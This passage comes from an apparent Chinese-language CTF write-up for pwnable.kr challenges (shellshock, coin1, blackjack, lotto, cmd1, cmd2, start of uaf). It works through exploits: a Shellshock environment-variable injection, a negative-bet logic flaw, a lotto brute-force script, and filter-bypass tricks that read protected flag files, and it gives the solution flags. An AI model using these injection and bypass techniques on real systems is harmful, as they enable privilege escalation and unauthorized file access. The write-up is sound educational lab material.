- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 11:45:56 2023 from 84.110.212.230
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
shellshock@pwnable:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 117 root root             4096 Nov 10  2022 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

我们可以看到四个文件`shellshock`、`shellshock.c`和`flag`还有`bash`，其中`shellshock`是`ELF`二进制可执行文件，`shellshock.c`是编译二进制文件的`C`代码，用户`shellshock`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat shellshock.c`来查看`shellshock.c`的代码。

```bash
shellshock@pwnable:~$ cat shellshock.c
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

该挑战来自CVE-2014-6271漏洞，这是一个被称为Shellshock的漏洞问题。系统中提供的二进制文件`bash`就具有CVE-2014-6271漏洞。我们可以输入以下内容进行测试：

```bash
env x='() { :;}; echo Fuck' ./bash -c "echo You!"
```

通过查看终端输出，我们可以确定系统提供的二进制文件`bash`能受到shellshock攻击，如果已经打了补丁的话，`bash`会静默退出。利用该漏洞，我们可以将`./shellshock`中的系统调用`system("/home/shellshock/bash -c 'echo shock_me'");`进行拼接。

```bash
env x='() { :;}; /bin/cat flag' ./shellshock
```

这样就能拿到`flag`：`only if I knew CVE-2014-6271 ten years ago..!!`。

```bash
shellshock@pwnable:~$ env x='() { :;}; echo Fuck' ./bash -c "echo You!"
Fuck
You!
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

相关链接：[**Shellshock: How does it actually work?**](https://fedoramagazine.org/shellshock-how-does-it-actually-work/)

------

### coin1

这是**Pwnable.kr**的第十一个挑战`coin1`，来自**[Toddler's Bottle]**部分。

```bash
Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
```

根据题目描述，先`nc`进靶机看看情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ nc pwnable.kr 9007

        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -

N=622 C=10
```

简单来说，我们需要在有限的猜测次数下，从一组硬币中找到一枚假币，这应该可以用二分搜索法解决，每次猜出一半可能的硬币。主要问题在于我们需要在`60`秒内找到`100`枚假币。编写`Python`代码进行求解，然而超时啦！

```python
from pwn import *
import re

io = remote('pwnable.kr', 9007)
log.info(io.recv())
for _ in range(100):
    msg = io.recv().decode()
    log.info(msg)
    match = re.findall(r'N=(\d+) C=(\d+)', msg)[0]
    if match:
        N, C = int(match[0]), int(match[1])
    begin, end = 0, N-1
    while begin <= end and C > 0:
        mid = (begin + end) // 2
        guess = ' '.join(str(i) for i in range(begin, mid+1))
        io.sendline(guess.encode('utf-8'))
        weight = int(io.recvline()[:-1])
        if weight % 10 == 0:
            begin = mid + 1
        else:
            end = mid - 1
        C -= 1
    for _ in range(C):
        io.sendline(b'0')
        io.recv()
    io.sendline(str(begin).encode('utf-8'))
    log.info(io.recv())


log.success(io.recvline())  # Congrats! get your flag
flag = io.recvline()  # b1NaRy_S34rch1nG_1s_3asy_p3asy
log.success(flag)
io.close()
```

题目说了如果网络响应时间太慢的话可以`SSH`进入`pwnable.kr`来进行求解，`localhost`就是如此丝滑，一下就算出`flag`啦。

```bash
shellshock@pwnable:~$ mkdir /tmp/t0ur1st
shellshock@pwnable:~$ cd /tmp/t0ur1st
shellshock@pwnable:/tmp/t0ur1st$ vim exp.py
shellshock@pwnable:/tmp/t0ur1st$ python exp.py
[+] Opening connection to localhost on port 9007: Done
[*] 
        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------
        
        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.
        
        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer
        
        - Example -
        [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial
        [Client] 0 1         # weigh first and second coin
        [Server] 20            # scale result : 20
        [Client] 3            # weigh fourth coin
        [Server] 10            # scale result : 10
        [Client] 2             # counterfeit coin is third!
        [Server] Correct!
    
        - Ready? starting in 3 sec... -
        
[*] N=798 C=10
[*] Correct! (0)
[*] N=490 C=9
[*] Correct! (1)
[*] N=491 C=9
[*] Correct! (2)
[*] N=694 C=10
[*] Correct! (3)
[*] N=292 C=9
[*] Correct! (4)
[*] N=637 C=10
[*] Correct! (5)
[*] N=216 C=8
[*] Correct! (6)
[*] N=246 C=8
[*] Correct! (7)
[*] N=304 C=9
[*] Correct! (8)
[*] N=416 C=9
[*] Correct! (9)
[*] N=461 C=9
[*] Correct! (10)
[*] N=515 C=10
[*] Correct! (11)
[*] N=531 C=10
[*] Correct! (12)
[*] N=134 C=8
[*] Correct! (13)
[*] N=696 C=10
[*] Correct! (14)
[*] N=476 C=9
[*] Correct! (15)
[*] N=785 C=10
[*] Correct! (16)
[*] N=218 C=8
[*] Correct! (17)
[*] N=732 C=10
[*] Correct! (18)
[*] N=587 C=10
[*] Correct! (19)
[*] N=962 C=10
[*] Correct! (20)
[*] N=675 C=10
[*] Correct! (21)
[*] N=589 C=10
[*] Correct! (22)
[*] N=945 C=10
[*] Correct! (23)
[*] N=706 C=10
[*] Correct! (24)
[*] N=362 C=9
[*] Correct! (25)
[*] N=627 C=10
[*] Correct! (26)
[*] N=50 C=6
[*] Correct! (27)
[*] N=547 C=10
[*] Correct! (28)
[*] N=652 C=10
[*] Correct! (29)
[*] N=118 C=7
[*] Correct! (30)
[*] N=921 C=10
[*] Correct! (31)
[*] N=174 C=8
[*] Correct! (32)
[*] N=675 C=10
[*] Correct! (33)
[*] N=908 C=10
[*] Correct! (34)
[*] N=976 C=10
[*] Correct! (35)
[*] N=353 C=9
[*] Correct! (36)
[*] N=315 C=9
[*] Correct! (37)
[*] N=908 C=10
[*] Correct! (38)
[*] N=156 C=8
[*] Correct! (39)
[*] N=960 C=10
[*] Correct! (40)
[*] N=104 C=7
[*] Correct! (41)
[*] N=200 C=8
[*] Correct! (42)
[*] N=615 C=10
[*] Correct! (43)
[*] N=387 C=9
[*] Correct! (44)
[*] N=825 C=10
[*] Correct! (45)
[*] N=730 C=10
[*] Correct! (46)
[*] N=472 C=9
[*] Correct! (47)
[*] N=358 C=9
[*] Correct! (48)
[*] N=551 C=10
[*] Correct! (49)
[*] N=736 C=10
[*] Correct! (50)
[*] N=702 C=10
[*] Correct! (51)
[*] N=682 C=10
[*] Correct! (52)
[*] N=158 C=8
[*] Correct! (53)
[*] N=166 C=8
[*] Correct! (54)
[*] N=440 C=9
[*] Correct! (55)
[*] N=707 C=10
[*] Correct! (56)
[*] N=656 C=10
[*] Correct! (57)
[*] N=3 C=2
[*] Correct! (58)
[*] N=348 C=9
[*] Correct! (59)
[*] N=476 C=9
[*] Correct! (60)
[*] N=845 C=10
[*] Correct! (61)
[*] N=68 C=7
[*] Correct! (62)
[*] N=255 C=8
[*] Correct! (63)
[*] N=912 C=10
[*] Correct! (64)
[*] N=413 C=9
[*] Correct! (65)
[*] N=948 C=10
[*] Correct! (66)
[*] N=873 C=10
[*] Correct! (67)
[*] N=414 C=9
[*] Correct! (68)
[*] N=472 C=9
[*] Correct! (69)
[*] N=756 C=10
[*] Correct! (70)
[*] N=626 C=10
[*] Correct! (71)
[*] N=859 C=10
[*] Correct! (72)
[*] N=208 C=8
[*] Correct! (73)
[*] N=890 C=10
[*] Correct! (74)
[*] N=694 C=10
[*] Correct! (75)
[*] N=629 C=10
[*] Correct! (76)
[*] N=936 C=10
[*] Correct! (77)
[*] N=41 C=6
[*] Correct! (78)
[*] N=330 C=9
[*] Correct! (79)
[*] N=492 C=9
[*] Correct! (80)
[*] N=655 C=10
[*] Correct! (81)
[*] N=654 C=10
[*] Correct! (82)
[*] N=72 C=7
[*] Correct! (83)
[*] N=737 C=10
[*] Correct! (84)
[*] N=425 C=9
[*] Correct! (85)
[*] N=526 C=10
[*] Correct! (86)
[*] N=361 C=9
[*] Correct! (87)
[*] N=198 C=8
[*] Correct! (88)
[*] N=657 C=10
[*] Correct! (89)
[*] N=509 C=9
[*] Correct! (90)
[*] N=371 C=9
[*] Correct! (91)
[*] N=773 C=10
[*] Correct! (92)
[*] N=260 C=9
[*] Correct! (93)
[*] N=905 C=10
[*] Correct! (94)
[*] N=776 C=10
[*] Correct! (95)
[*] N=379 C=9
[*] Correct! (96)
[*] N=331 C=9
[*] Correct! (97)
[*] N=602 C=10
[*] Correct! (98)
[*] N=632 C=10
[*] Correct! (99)
[+] Congrats! get your flag
[+] b1NaRy_S34rch1nG_1s_3asy_p3asy
[*] Closed connection to localhost port 9007
```

提交 `b1NaRy_S34rch1nG_1s_3asy_p3asy` 即可。

------

### blackjack

这是**Pwnable.kr**的第十二个挑战`blackjack`，来自**[Toddler's Bottle]**部分。

```bash
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
```

题目描述已经给出了这题的`C`语言源程序，进行代码审计。注意到`betting()`函数中存在漏洞。这个函数询问玩家想在这一轮下注多少，然后检查下注金额是否不超过玩家当前拥有的现金数额。然而，该函数不会检查下注金额是否为负数。

```c
int betting() //Asks user amount to bet
{
    printf("\n\nEnter Bet: $");
    scanf("%d", &bet);

    if (bet > cash) //If player tries to bet more money than player has
    {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
    }
    else return bet;
} // End Function
```

继续审计`play()`函数中的代码，赢钱的逻辑看起来不错，但输钱的逻辑并没有考虑到负赌注的情况。

```c
betting(); //Prompts user to enter bet amount

while(i<=21) // While loop used to keep asking user to hit or stay at most twenty-one times
             // because there is a chance user can generate twenty-one consecutive 1's
{
     if(p==21) //If user total is 21, win
     {
        printf("\nUnbelievable! You Win!\n");
        won = won+1;
        cash = cash+bet;
        printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
        dealer_total=0;
        askover();
    }
  
    if(p>21) //If player total is over 21, loss
    {
        printf("\nWoah Buddy, You Went WAY over.\n");
        loss = loss+1;
        cash = cash - bet;
        printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
        dealer_total=0;
        askover();
    }

    if(p<=21) //If player total is less than 21, ask to hit or stay
    {         
        printf("\n\nWould You Like to Hit or Stay?");
          
        scanf("%c", &choice3);
        while((choice3!='H') && (choice3!='h') && (choice3!='S') && (choice3!='s')) // If invalid choice entered
        {                                                                           
            printf("\n");
            printf("Please Enter H to Hit or S to Stay.\n");
            scanf("%c",&choice3);
        }


        if((choice3=='H') || (choice3=='h')) // If Hit, continues
        { 
            randcard();
            player_total = p + l;
            p = player_total;
            printf("\nYour Total is %d\n", p);
            dealer();
            if(dealer_total==21) //Is dealer total is 21, loss
            {
                printf("\nDealer Has the Better Hand. You Lose.\n");
                loss = loss+1;
                cash = cash - bet;
                printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                dealer_total=0;
                askover();
            } 
  
            if(dealer_total>21) //If dealer total is over 21, win
            {                      
                printf("\nDealer Has Went Over!. You Win!\n");
                won = won+1;
                cash = cash+bet;
                printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                dealer_total=0;
                askover();
            }
        }
        if((choice3=='S') || (choice3=='s')) // If Stay, does not continue
        {
            printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total);
            stay();
        }
    }
    i++; //While player total and dealer total are less than 21, re-do while loop 
} // End While Loop
```

再来看`stay()`函数，同样没有考虑到赌注为负数的情况。这样看来，我们只需要摆烂就能赢钱，即在发牌后选择留，我们的负赌注将从现金总额中减去（负负得正即我们赚钱）。

```c
void stay() //Function for when user selects 'Stay'
{
    dealer(); //If stay selected, dealer continues going
    if(dealer_total>=17)
    {
        if(player_total>=dealer_total) //If player's total is more than dealer's total, win
        {
            printf("\nUnbelievable! You Win!\n");
            won = won+1;
            cash = cash+bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
        if(player_total<dealer_total) //If player's total is less than dealer's total, loss
        {
            printf("\nDealer Has the Better Hand. You Lose.\n");
            loss = loss+1;
            cash = cash - bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
        if(dealer_total>21) //If dealer's total is more than 21, win
        {
            printf("\nUnbelievable! You Win!\n");
            won = won+1;
            cash = cash+bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
    }
    else
    {
        stay();
    }
} // End Function
```

因此最简单最消极最摆烂的做法就是：

```bash
$ nc pwnable.kr 9009
Y          # Are You Ready? (Y/N)
1          # Enter 1 to Begin the Greatest Game Ever Played.
-5201314   # Enter Bet: a large negative number
S          # Enter S to Stay.
Y          # Enter Y to Play Again.
YaY_I_AM_A_MILLIONARE_LOL   # flag
```

终端的部分显示如下：

```bash
ash: $500
-------
|D    |
|  9  |
|    D|
-------

Your Total is 9

The Dealer Has a Total of 10

Enter Bet: $-5201314


Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
S

You Have Chosen to Stay at 9. Wise Decision!

The Dealer Has a Total of 20
Dealer Has the Better Hand. You Lose.

You have 0 Wins and 1 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
Y
```

输入`Y`之后，在下一局游戏开始前，`flag`会被打印出来：`YaY_I_AM_A_MILLIONARE_LOL`。

```bash
YaY_I_AM_A_MILLIONARE_LOL


Cash: $5201814
-------
|H    |
|  K  |
|    H|
-------

Your Total is 10

The Dealer Has a Total of 11

Enter Bet: $
```

------

### lotto

这是**Pwnable.kr**的第十三个挑战`lotto`，来自**[Toddler's Bottle]**部分。

```bash
Mommy! I made a lotto program for my homework.
do you want to play?


ssh lotto@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh lotto@pwnable.kr -p2222
lotto@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 06:44:44 2023 from 176.231.106.46
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
lotto@pwnable:~$ ls -la
total 44
drwxr-x---   5 root      lotto  4096 Oct 23  2016 .
drwxr-xr-x 117 root      root   4096 Nov 10  2022 ..
d---------   2 root      root   4096 Feb 18  2015 .bash_history
-r--r-----   1 lotto_pwn root     55 Feb 18  2015 flag
dr-xr-xr-x   2 root      root   4096 Feb 18  2015 .irssi
-r-sr-x---   1 lotto_pwn lotto 13081 Feb 18  2015 lotto
-r--r--r--   1 root      root   1713 Feb 18  2015 lotto.c
drwxr-xr-x   2 root      root   4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`lotto`、`lotto.c`和`flag`，其中`lotto`是`ELF`二进制可执行文件，`lotto.c`是编译二进制文件的`C`代码，用户`lotto`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat lotto.c`来查看`lotto.c`的代码。

```bash
lotto@pwnable:~$ cat lotto.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
    int i;
    printf("Submit your 6 lotto bytes : ");
    fflush(stdout);

    int r;
    r = read(0, submit, 6);

    printf("Lotto Start!\n");
    //sleep(1);

    // generate lotto numbers
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1){
        printf("error. tell admin\n");
        exit(-1);
    }
    unsigned char lotto[6];
    if(read(fd, lotto, 6) != 6){
        printf("error2. tell admin\n");
        exit(-1);
    }
    for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;     // 1 ~ 45
    }
    close(fd);

    // calculate lotto score
    int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }

    // win!
    if(match == 6){
            system("/bin/cat flag");
    }
    else{
            printf("bad luck...\n");
    }

}

void help(){
    printf("- nLotto Rule -\n");
    printf("nlotto is consisted with 6 random natural numbers less than 46\n");
    printf("your goal is to match lotto numbers as many as you can\n");
    printf("if you win lottery for *1st place*, you will get reward\n");
    printf("for more details, follow the link below\n");
    printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
    printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){
    // menu
    unsigned int menu;

    while(1){
        printf("- Select Menu -\n");
        printf("1. Play Lotto\n");
        printf("2. Help\n");
        printf("3. Exit\n");

        scanf("%d", &menu);

        switch(menu){
            case 1:
                play();
                break;
            case 2:
                help();
                break;
            case 3:
                printf("bye\n");
                return 0;
            default:
                printf("invalid menu\n");
                break;
        }
    }
    return 0;
}
```

游戏要求 `6` 个字节并将它们与ASCII码在 `[1-45]` 这范围内的 `6` 个随机字节进行比较，如果匹配数为 `6`，则我们赢得游戏。仔细审计代码发现程序将每个随机字节与所有6个输入字节进行比较，只要其中有一个匹配就获胜，所以我们可以输入`6`个相同的字符（其中这些字符的ASCII码数值在`[1-45]`内）来赌。编写`Python`代码求解：

```python
from pwn import *

shell = ssh(user='lotto', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./lotto')
while True:
    io.sendlineafter('3. Exit\n', b'1')
    io.recv()
    io.sendline(b'-'*6)
    _, flag = io.recvlines(2)
    if b'bad' not in flag:
        log.success(flag)  # sorry mom... I FORGOT to check duplicate numbers... :(
        break
io.close()
shell.close()
```

提交 `sorry mom... I FORGOT to check duplicate numbers... :(` 即可。

------

### cmd1

这是**Pwnable.kr**的第十四个挑战`cmd1`，来自**[Toddler's Bottle]**部分。

```bash
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh cmd1@pwnable.kr -p2222
cmd1@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 18:33:53 2023 from 147.235.193.152
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
cmd1@pwnable:~$ ls -la
total 40
drwxr-x---   5 root cmd1     4096 Mar 23  2018 .
drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
d---------   2 root root     4096 Jul 12  2015 .bash_history
-r-xr-sr-x   1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r--   1 root root      320 Mar 23  2018 cmd1.c
-r--r-----   1 root cmd1_pwn   48 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`cmd1`、`cmd1.c`和`flag`，其中`cmd1`是`ELF`二进制可执行文件，`cmd1.c`是编译二进制文件的`C`代码，用户`cmd1`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat cmd1.c`来查看`cmd1.c`的代码。

```c
cmd1@pwnable:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/thankyouverymuch");
    if(filter(argv[1])) return 0;
    system( argv[1] );
    return 0;
}
```

虽然`flag`，`sh`，`tmp`都被过滤啦，但是办法还是有的，比如我们可以用`/bin/cat fla*`来将当前目录所有以`fla`开头的文件内容打印到终端，可以得到`flag`：`mommy now I get what PATH environment is for :)`。

```bash
cmd1@pwnable:~$ ./cmd1 "/bin/cat fla*"
mommy now I get what PATH environment is for :)
```

------

### cmd2

这是**Pwnable.kr**的第十五个挑战`cmd2`，来自**[Toddler's Bottle]**部分。

```bash
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

首先通过`ssh`远程连接目标主机，需要注意这题的密码是上题的`flag`：`mommy now I get what PATH environment is for :)`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh cmd2@pwnable.kr -p2222
cmd2@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 15:41:13 2023 from 12.249.36.98
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
cmd2@pwnable:~$ ls -la
total 40
drwxr-x---   5 root cmd2     4096 Oct 23  2016 .
drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
d---------   2 root root     4096 Jul 14  2015 .bash_history
-r-xr-sr-x   1 root cmd2_pwn 8794 Dec 21  2015 cmd2
-rw-r--r--   1 root root      586 Dec 21  2015 cmd2.c
-r--r-----   1 root cmd2_pwn   30 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`cmd2`、`cmd2.c`和`flag`，其中`cmd2`是`ELF`二进制可执行文件，`cmd2.c`是编译二进制文件的`C`代码，用户`cmd2`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat cmd2.c`来查看`cmd2.c`的代码。

```bash
cmd2@pwnable:~$ cat cmd2.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

我们可以看到更多的关键字被过滤啦，包括`=`，`PATH`，`export`，`/`，`flag`和`，同时环境变量中的值全被清空啦。

程序还用`putenv`将环境变量`PATH`设置为`/no_command_execution_until_you_become_a_hacker`。先来想办法得到最重要的`/`。

```bash
cmd2@pwnable:~$ pwd
/home/cmd2
cmd2@pwnable:~$ cd /
cmd2@pwnable:/$ pwd
/
cmd2@pwnable:/$ echo $(pwd)  # 这样的话使用 $(pwd) 同样可以得到 /
/
```

接着就很简单啦，用和上一题类似的办法，需要注意的是我们应该使用单引号`'`而不是双引号`"`。因为在单引号内部，变量和命令将不会被展开或解析，单引号中的内容被视为字面字符串，保留原始形式。例如，在`'$pwd'`中，`$pwd`不会被替换为实际的当前目录路径，而是会被当作字符串 `"$pwd"`。而在双引号内部，变量和命令会被展开或解析，因此双引号内的内容会进行变量替换和命令替换。例如，在`"$pwd"`中，`$pwd`会被替换为实际的当前目录路径。

```bash
cmd2@pwnable:/$ /home/cmd2/cmd2 "$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*"
cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*
FuN_w1th_5h3ll_v4riabl3s_haha
```

提交`flag`：`FuN_w1th_5h3ll_v4riabl3s_haha`即可。

------

### uaf

这是**Pwnable.kr**的第十六个挑战`uaf`，来自**[Toddler's Bottle]**部分。题目`uaf`是`Use After Free`的缩写，这是一种当程序在其指向的内存被释放后继续使用指针时发生的漏洞。

```bash
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh uaf@pwnable.kr -p2222
uaf@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 14:35:44 2023 from 213.57.214.225
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
uaf@pwnable:~$ ls -la
total 44
drwxr-x---   5 root uaf      4096 Oct 23  2016 .
drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
d---------   2 root root     4096 Sep 21  2015 .bash_history
-rw-r-----   1 root uaf_pwn    22 Sep 26  2015 flag
dr-xr-xr-x   2 root root     4096 Sep 21  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
